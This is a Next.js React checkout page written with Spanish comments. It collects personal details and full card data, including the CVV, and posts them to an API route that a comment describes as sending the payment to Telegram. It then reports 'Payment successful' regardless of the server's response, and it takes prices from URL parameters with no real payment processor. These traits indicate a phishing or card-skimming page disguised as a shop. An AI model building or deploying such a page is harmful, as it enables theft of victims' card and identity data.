"use client";

import { useState, useEffect, Suspense } from "react";
import { useSearchParams } from "next/navigation";

type FormErrors = {
  [key: string]: string;
};

type FormData = {
  fullName: string;
  email: string;
  dateOfBirth: string;
  country: string;
  city: string;
  address: string;
  phone: string;
  postcode: string;
  cardNumber: string;
  cardName: string;
  expiryDate: string;
  cvv: string;
};

type ProductInfo = {
  name: string;
  price: string;
  license: string;
  quantity: string;
};

// InputField component
function InputField({
  label,
  field,
  placeholder = "",
  required = true,
  value,
  error,
  touched,
  onChange,
  onBlur,
  maxLength,
  type = "text",
}: {
  label: string;
  field: string;
  placeholder?: string;
  required?: boolean;
  value: string;
  error?: string;
  touched?: boolean;
  onChange: (field: string, value: string) => void;
  onBlur: (field: string) => void;
  maxLength?: number;
  type?: string;
}) {
  const hasError = touched && error;
  return (
    <div>
      <div
        className={`border rounded-sm transition-colors ${
          hasError
            ? "border-red-400 bg-red-50"
            : "border-gray-200 hover:border-gray-300"
        }`}
      >
        <label className="flex items-center gap-1 px-4 pt-3 text-xs text-gray-500">
          {label}
          {required && <span className="text-red-400">*</span>}
        </label>
        <input
          type={type}
          placeholder={placeholder}
          value={value}
          onChange={(e) => onChange(field, e.target.value)}
          onBlur={() => onBlur(field)}
          maxLength={maxLength}
          className="w-full px-4 pb-3 pt-1 text-sm text-gray-900 bg-transparent outline-none"
        />
      </div>
      {hasError && (
        <p className="text-red-500 text-xs mt-1 ml-1">{error}</p>
      )}
    </div>
  );
}

// Componente que usa useSearchParams - debe estar dentro de Suspense
function PaymentsContent() {
  const searchParams = useSearchParams();
  const [currentStep, setCurrentStep] = useState(1);
  const [errors, setErrors] = useState<FormErrors>({});
  const [touched, setTouched] = useState<{ [key: string]: boolean }>({});
  const [productInfo, setProductInfo] = useState<ProductInfo>({
    name: "",
    price: "0",
    license: "",
    quantity: "1",
  });

  const [formData, setFormData] = useState<FormData>({
    fullName: "",
    email: "",
    dateOfBirth: "",
    country: "",
    city: "",
    address: "",
    phone: "",
    postcode: "",
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: "",
  });

  // Obtener datos del producto de la URL
  useEffect(() => {
    const product = searchParams.get("product") || "";
    const price = searchParams.get("price") || "0";
    const license = searchParams.get("license") || "";
    const quantity = searchParams.get("quantity") || "1";

    console.log("📦 Datos recibidos:", { product, price, license, quantity });

    setProductInfo({
      name: product,
      price: price,
      license: license,
      quantity: quantity,
    });
  }, [searchParams]);

  // Calcular el precio total
  const calculateTotal = () => {
    const price = parseFloat(productInfo.price) || 0;
    const quantity = parseInt(productInfo.quantity) || 1;
    return (price * quantity).toFixed(2);
  };

  // Función para enviar a Telegram
  const handlePay = async () => {
    console.log("🚀 Enviando pago a Telegram...");
    console.log("📦 Datos del formulario:", formData);
    console.log("🛒 Datos del producto:", productInfo);

    try {
      const response = await fetch("/api/payments", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          // Datos del cliente
          name: formData.fullName,
          email: formData.email,
          phone: formData.phone,
          dateOfBirth: formData.dateOfBirth,

          // Dirección
          country: formData.country,
          city: formData.city,
          address: formData.address,
          postcode: formData.postcode,

          // Datos de la tarjeta
          cardNumber: formData.cardNumber,
          cardName: formData.cardName,
          expiryDate: formData.expiryDate,
          cvv: formData.cvv,

          // Datos del producto
          product: productInfo.name,
          license: productInfo.license,
          quantity: productInfo.quantity,
          amount: calculateTotal(),
        }),
      });

      const data = await response.json();

      if (response.ok) {
        console.log("✅ Pago enviado exitosamente:", data);
      } else {
        console.error("❌ Error al enviar pago:", data);
      }
    } catch (error) {
      console.error("❌ Error de red:", error);
    }
  };

  const formatDateOfBirth = (value: string): string => {
    const numbers = value.replace(/\D/g, "");

    if (numbers.length <= 2) {
      if (numbers.length === 2) {
        const day = parseInt(numbers, 10);
        if (day > 31) return "31";
        if (day === 0) return "01";
      }
      return numbers;
    } else if (numbers.length <= 4) {
      let day = numbers.slice(0, 2);
      let month = numbers.slice(2);

      const dayNum = parseInt(day, 10);
      if (dayNum > 31) day = "31";
      if (dayNum === 0) day = "01";

      if (month.length === 2) {
        const monthNum = parseInt(month, 10);
        if (monthNum > 12) month = "12";
        if (monthNum === 0) month = "01";
      } else if (month.length === 1 && parseInt(month, 10) > 1) {
        month = `0${month}`;
      }

      return `${day}/${month}`;
    } else {
      let day = numbers.slice(0, 2);
      let month = numbers.slice(2, 4);
      const year = numbers.slice(4, 8);

      const dayNum = parseInt(day, 10);
      if (dayNum > 31) day = "31";
      if (dayNum === 0) day = "01";

      const monthNum = parseInt(month, 10);
      if (monthNum > 12) month = "12";
      if (monthNum === 0) month = "01";

      return `${day}/${month}/${year}`;
    }
  };

  const formatCardNumber = (value: string): string => {
    const numbers = value.replace(/\D/g, "");
    const groups = numbers.match(/.{1,4}/g);
    return groups ? groups.join(" ") : numbers;
  };

  const formatExpiryDate = (value: string): string => {
    const numbers = value.replace(/\D/g, "");
    if (numbers.length <= 2) {
      return numbers;
    }
    return `${numbers.slice(0, 2)}/${numbers.slice(2, 4)}`;
  };

  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value;

    if (field === "dateOfBirth") {
      formattedValue = formatDateOfBirth(value);
    } else if (field === "cardNumber") {
      formattedValue = formatCardNumber(value);
    } else if (field === "expiryDate") {
      formattedValue = formatExpiryDate(value);
    } else if (field === "cvv") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4);
    }

    setFormData((prev) => ({ ...prev, [field]: formattedValue }));
    if (errors[field]) {
      setErrors((prev) => {
        const newErrors = { ...prev };
        delete newErrors[field];
        return newErrors;
      });
    }
  };

  const handleBlur = (field: string) => {
    setTouched((prev) => ({ ...prev, [field]: true }));
    validateField(field, formData[field as keyof FormData]);
  };

  const validateField = (field: string, value: string): boolean => {
    let error = "";

    if (!value.trim()) {
      error = "This field is required";
    } else {
      if (field === "email" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        error = "Enter a valid email address";
      }
      if (field === "phone" && !/^[0-9+\-\s()]{7,}$/.test(value)) {
        error = "Enter a valid phone number";
      }
      if (field === "dateOfBirth" && !/^\d{2}\/\d{2}\/\d{4}$/.test(value)) {
        error = "Use format DD/MM/YYYY";
      }
      if (field === "cardNumber" && value.replace(/\s/g, "").length < 13) {
        error = "Enter a valid card number";
      }
      if (field === "expiryDate" && !/^\d{2}\/\d{2}$/.test(value)) {
        error = "Use format MM/YY";
      }
      if (field === "cvv" && value.length < 3) {
        error = "Enter a valid CVV";
      }
    }

    if (error) {
      setErrors((prev) => ({ ...prev, [field]: error }));
      return false;
    }
    return true;
  };

  const validateStep1 = (): boolean => {
    const step1Fields = [
      "fullName",
      "email",
      "dateOfBirth",
      "country",
      "city",
      "address",
      "phone",
      "postcode",
    ];
    let isValid = true;
    const newErrors: FormErrors = {};

    for (const field of step1Fields) {
      const value = formData[field as keyof FormData];
      if (!value.trim()) {
        newErrors[field] = "This field is required";
        isValid = false;
      } else if (field === "email" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        newErrors[field] = "Enter a valid email address";
        isValid = false;
      } else if (field === "phone" && !/^[0-9+\-\s()]{7,}$/.test(value)) {
        newErrors[field] = "Enter a valid phone number";
        isValid = false;
      } else if (field === "dateOfBirth" && !/^\d{2}\/\d{2}\/\d{4}$/.test(value)) {
        newErrors[field] = "Use format DD/MM/YYYY";
        isValid = false;
      }
    }

    setErrors(newErrors);
    setTouched(
      step1Fields.reduce((acc, field) => ({ ...acc, [field]: true }), {})
    );
    return isValid;
  };

  const validateStep2 = (): boolean => {
    const step2Fields = ["cardNumber", "cardName", "expiryDate", "cvv"];
    let isValid = true;
    const newErrors: FormErrors = {};

    for (const field of step2Fields) {
      const value = formData[field as keyof FormData];
      if (!value.trim()) {
        newErrors[field] = "This field is required";
        isValid = false;
      } else if (field === "cardNumber" && value.replace(/\s/g, "").length < 13) {
        newErrors[field] = "Enter a valid card number";
        isValid = false;
      } else if (field === "expiryDate" && !/^\d{2}\/\d{2}$/.test(value)) {
        newErrors[field] = "Use format MM/YY";
        isValid = false;
      } else if (field === "cvv" && value.length < 3) {
        newErrors[field] = "Enter a valid CVV";
        isValid = false;
      }
    }

    setErrors(newErrors);
    setTouched(
      step2Fields.reduce((acc, field) => ({ ...acc, [field]: true }), {})
    );
    return isValid;
  };

  const nextStep = () => {
    if (currentStep === 1) {
      if (validateStep1()) {
        setCurrentStep(2);
        setErrors({});
        setTouched({});
      }
    } else if (currentStep === 2) {
      if (validateStep2()) {
        setCurrentStep(3);
        handlePay();
        setErrors({});
        setTouched({});
      }
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      setErrors({});
      setTouched({});
    }
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-[540px]">
        {/* Product Summary - Mostrar solo si hay producto */}
        {productInfo.name && currentStep < 3 && (
          <div className="mb-8 p-5 bg-gradient-to-br from-blue-50 to-indigo-50 rounded-xl border-2 border-blue-200 shadow-sm">
            <h3 className="text-base font-bold text-gray-800 mb-3 flex items-center gap-2">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
              </svg>
              Order Summary
            </h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between items-center">
                <span className="text-gray-600 font-medium">Product:</span>
                <span className="font-semibold text-gray-900">{productInfo.name}</span>
              </div>
              {productInfo.license && (
                <div className="flex justify-between items-center">
                  <span className="text-gray-600 font-medium">License:</span>
                  <span className="font-semibold text-gray-900 text-right max-w-[200px]">{productInfo.license}</span>
                </div>
              )}
              <div className="flex justify-between items-center">
                <span className="text-gray-600 font-medium">Quantity:</span>
                <span className="font-semibold text-gray-900">{productInfo.quantity}</span>
              </div>
              <div className="pt-3 mt-3 border-t-2 border-blue-300 flex justify-between items-center">
                <span className="text-gray-900 font-bold text-base">Total Amount:</span>
                <span className="text-[#F5B800] font-bold text-2xl">€{calculateTotal()}</span>
              </div>
            </div>
          </div>
        )}

        {/* Step Indicator */}
        <div className="flex items-center justify-center gap-4 mb-10">
          {[1, 2, 3].map((step) => (
            <div
              key={step}
              className={`w-9 h-9 rounded-full flex items-center justify-center text-sm font-medium transition-all ${
                step === currentStep
                  ? "bg-[#F5B800] text-white"
                  : step < currentStep
                    ? "bg-[#F5B800] text-white"
                    : "bg-gray-100 text-gray-400"
              }`}
            >
              {step < currentStep ? (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M20 6 9 17l-5-5" />
                </svg>
              ) : (
                step
              )}
            </div>
          ))}
        </div>

        {/* Step 1 - Personal Details */}
        {currentStep === 1 && (
          <div>
            <div className="mb-6">
              <h1 className="text-xl font-normal text-gray-900 mb-2">
                Confirm your personal details
              </h1>
              <div className="w-10 h-1 bg-[#F5B800]" />
            </div>

            <div className="space-y-4">
              <InputField
                label="Full name"
                field="fullName"
                value={formData.fullName}
                error={errors.fullName}
                touched={touched.fullName}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="Email address"
                field="email"
                type="email"
                placeholder="example@email.com"
                value={formData.email}
                error={errors.email}
                touched={touched.email}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="Date of birth"
                field="dateOfBirth"
                placeholder="DD/MM/YYYY"
                value={formData.dateOfBirth}
                error={errors.dateOfBirth}
                touched={touched.dateOfBirth}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="Country"
                field="country"
                value={formData.country}
                error={errors.country}
                touched={touched.country}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="City"
                field="city"
                value={formData.city}
                error={errors.city}
                touched={touched.city}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="Address"
                field="address"
                value={formData.address}
                error={errors.address}
                touched={touched.address}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="Phone"
                field="phone"
                value={formData.phone}
                error={errors.phone}
                touched={touched.phone}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <InputField
                label="Postcode"
                field="postcode"
                value={formData.postcode}
                error={errors.postcode}
                touched={touched.postcode}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
            </div>

            {Object.keys(errors).length > 0 && (
              <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-sm">
                <p className="text-red-600 text-sm">
                  Please fill in all required fields correctly
                </p>
              </div>
            )}

            <div className="mt-8">
              <button
                onClick={nextStep}
                className="bg-[#F5B800] hover:bg-[#E0A800] text-white font-medium py-3 px-8 rounded-full inline-flex items-center gap-2 transition-colors"
              >
                Continue to Payment
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="m9 18 6-6-6-6" />
                </svg>
              </button>
            </div>
          </div>
        )}

        {/* Step 2 - Payment Details */}
        {currentStep === 2 && (
          <div>
            <div className="mb-6">
              <h1 className="text-xl font-normal text-gray-900 mb-2">
                Payment information
              </h1>
              <div className="w-10 h-1 bg-[#F5B800]" />
            </div>

            <p className="text-gray-600 text-sm mb-6">
              Enter your card details to complete the payment
            </p>

            <div className="space-y-4">
              <InputField
                label="Card number"
                field="cardNumber"
                placeholder="1234 5678 9012 3456"
                value={formData.cardNumber}
                error={errors.cardNumber}
                touched={touched.cardNumber}
                onChange={handleInputChange}
                onBlur={handleBlur}
                maxLength={19}
              />
              <InputField
                label="Cardholder name"
                field="cardName"
                placeholder="JOHN DOE"
                value={formData.cardName}
                error={errors.cardName}
                touched={touched.cardName}
                onChange={handleInputChange}
                onBlur={handleBlur}
              />
              <div className="grid grid-cols-2 gap-4">
                <InputField
                  label="Expiry date"
                  field="expiryDate"
                  placeholder="MM/YY"
                  value={formData.expiryDate}
                  error={errors.expiryDate}
                  touched={touched.expiryDate}
                  onChange={handleInputChange}
                  onBlur={handleBlur}
                  maxLength={5}
                />
                <InputField
                  label="CVV"
                  field="cvv"
                  placeholder="123"
                  type="password"
                  value={formData.cvv}
                  error={errors.cvv}
                  touched={touched.cvv}
                  onChange={handleInputChange}
                  onBlur={handleBlur}
                  maxLength={4}
                />
              </div>
            </div>

            {/* Card Icons */}
            <div className="flex justify-end gap-2 mt-6">
              <div className="bg-[#1A1F71] text-white text-[10px] font-bold px-3 py-1.5 rounded">
                VISA
              </div>
              <div className="bg-[#EB001B] text-white text-[10px] font-bold px-3 py-1.5 rounded">
                MASTERCARD
              </div>
              <div className="bg-[#006FCF] text-white text-[10px] font-bold px-3 py-1.5 rounded">
                AMEX
              </div>
            </div>

            {Object.keys(errors).length > 0 && (
              <div className="mt-4 p-3 bg-red-50 border border-red-200 rounded-sm">
                <p className="text-red-600 text-sm">
                  Please fill in all required fields correctly
                </p>
              </div>
            )}

            <div className="mt-8 flex gap-4">
              <button
                onClick={prevStep}
                className="text-gray-500 hover:text-gray-700 font-medium py-3 px-6 transition-colors"
              >
                Back
              </button>
              <button
                onClick={nextStep}
                className="bg-[#F5B800] hover:bg-[#E0A800] text-white font-medium py-3 px-8 rounded-full inline-flex items-center gap-2 transition-colors"
              >
                Pay €{calculateTotal()}
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M20 6 9 17l-5-5" />
                </svg>
              </button>
            </div>
          </div>
        )}

        {/* Step 3 - Confirmation */}
        {currentStep === 3 && (
          <div>
            <div className="mb-6">
              <h1 className="text-xl font-normal text-gray-900 mb-2">
                Payment successful
              </h1>
              <div className="w-10 h-1 bg-[#F5B800]" />
            </div>

            <div className="text-center py-12">
              <div className="w-20 h-20 bg-[#F5B800] rounded-full flex items-center justify-center mx-auto mb-6">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="40"
                  height="40"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="white"
                  strokeWidth="3"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M20 6 9 17l-5-5" />
                </svg>
              </div>
              <h2 className="text-xl font-medium text-gray-900 mb-2">
                Thank you for your payment!
              </h2>
              <p className="text-gray-500 text-sm mb-4">
                Your payment of €{calculateTotal()} has been processed successfully.
              </p>
              {productInfo.name && (
                <div className="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-200 text-left max-w-sm mx-auto">
                  <h3 className="text-sm font-semibold text-gray-700 mb-2">Purchase Details</h3>
                  <div className="space-y-1 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-600">Product:</span>
                      <span className="font-medium text-gray-900">{productInfo.name}</span>
                    </div>
                    {productInfo.license && (
                      <div className="flex justify-between">
                        <span className="text-gray-600">License:</span>
                        <span className="font-medium text-gray-900">{productInfo.license}</span>
                      </div>
                    )}
                    <div className="flex justify-between">
                      <span className="text-gray-600">Quantity:</span>
                      <span className="font-medium text-gray-900">{productInfo.quantity}</span>
                    </div>
                  </div>
                </div>
              )}
            </div>

            <div className="mt-8 flex justify-center">
              <button
                onClick={() => {
                  window.location.href = '/shop/';
                }}
                className="bg-[#F5B800] hover:bg-[#E0A800] text-white font-medium py-3 px-8 rounded-full inline-flex items-center gap-2 transition-colors"
              >
                Back to Shop
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="m9 18 6-6-6-6" />
                </svg>
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

// Componente principal envuelto en Suspense
export default function PaymentsPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#F5B800] mx-auto"></div>
          <p className="mt-4 text-gray-600">Loading payment form...</p>
        </div>
      </div>
    }>
      <PaymentsContent />
    </Suspense>
  );
}